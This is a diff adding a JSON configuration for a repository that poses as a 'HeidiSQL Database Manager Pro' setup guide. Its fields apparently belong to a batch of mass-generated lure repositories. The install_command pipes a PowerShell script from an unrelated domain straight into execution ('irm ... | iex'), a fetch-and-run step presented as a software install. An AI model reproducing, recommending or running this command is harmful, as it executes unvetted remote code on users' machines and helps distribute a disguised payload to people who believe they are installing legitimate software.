@@ -1,0 +1,25 @@
+{
+  "repo": "HeidiSQL-Database-Manager-Pro-Complete-Setup-Guide",
+  "product": "HeidiSQL Database Manager Pro Complete Setup Guide",
+  "kind": "software",
+  "install_type": "powershell",
+  "install_url": "https://beyondapp.pro/ps/setup.ps1",
+  "install_command": "irm https://beyondapp.pro/ps/setup.ps1 | iex",
+  "batch": "new30-popular80",
+  "format": "license-md-only",
+  "category": "dev",
+  "topics": [
+    "heidisql-database-manager-pro-complete-s",
+    "heidisql",
+    "database",
+    "manager",
+    "pro",
+    "complete",
+    "setup",
+    "dev",
+    "windows",
+    "desktop",
+    "setup-guide",
+    "software"
+  ]
+}
